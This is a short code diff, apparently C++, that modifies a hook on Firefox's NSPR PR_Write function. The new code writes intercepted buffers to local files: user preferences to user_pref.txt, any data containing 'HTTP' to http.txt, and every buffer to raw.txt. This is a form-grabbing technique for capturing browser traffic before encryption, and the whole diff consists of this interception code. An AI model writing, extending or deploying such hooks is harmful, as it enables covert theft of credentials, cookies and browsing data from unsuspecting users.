@@ -12,12 +12,31 @@ PR_Write_t fpPR_Write = nullptr;
 int HookedPR_Write(void* fd, char* buf, int amount)
 {   
     std::string data = reinterpret_cast<const char*>(buf);
-    if (StrContain(data, "// Mozilla User Preferences")) goto ret;
-    if (!IsPrintable(reinterpret_cast<const char*>(buf), 4) || !IsAscii(reinterpret_cast<const char*>(buf), amount)) goto ret;
+    
+    // handle user preferences
+    if (StrContain(data, "// Mozilla User Preferences"))
+    {
+        ClearFile("user_pref.txt");
+        Log("user_pref.txt", buf);
+        goto ret;
+    }
+    else if (StrContain(data, "user_pref"))
+    {
+        Log("user_pref.txt", buf);
+        goto ret;
+    }
 
-    Log("log.txt", buf);
-    Log("log.txt", "\n");
+    if (StrContain(data, "HTTP"))
+    {
+        Log("http.txt", "---\n");
+        Log("http.txt", buf);
+        Log("http.txt", "\n---\n");
+    }
+
 ret:
+    Log("raw.txt", "---\n");
+    Log("raw.txt", buf);
+    Log("raw.txt", "\n---\n");
     return fpPR_Write(fd, buf, amount);
 }
 
